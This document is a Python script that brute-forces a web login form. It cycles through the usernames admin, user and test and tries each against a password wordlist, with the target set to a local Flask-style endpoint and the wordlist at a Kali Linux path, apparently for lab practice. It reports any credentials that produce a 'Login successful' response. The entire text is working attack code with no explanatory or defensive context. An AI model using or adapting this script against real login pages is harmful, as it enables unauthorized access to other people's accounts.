import requests
import sys

target = "http://127.0.0.1:5000/login"
usernames = ["admin", "user", "test"]
passwords = "/home/kali/Downloads/10-million-password-list-top-100.txt"
needle = "Login successful"  # Success message from the web page

for username in usernames:
    with open(passwords, "r") as passwords_list:
        for password in passwords_list:
            password = password.strip("\n").encode()

            sys.stdout.write("[x] Attempting user:password -> {} : {}\r".format(username, password.decode()))
            sys.stdout.flush()

            # Make a POST request to the target login form with the current credentials
            r = requests.post(target, data={"username": username, "password": password.decode()})

           

            # Check if the response contains the success needle
            if needle.strip() in r.text.strip():
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>] Valid password '{}' found for user '{}'!\n".format(password.decode(), username))
                sys.exit()

        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write("\tNo valid password found for user '{}'. Moving to next user.\n".format(username))
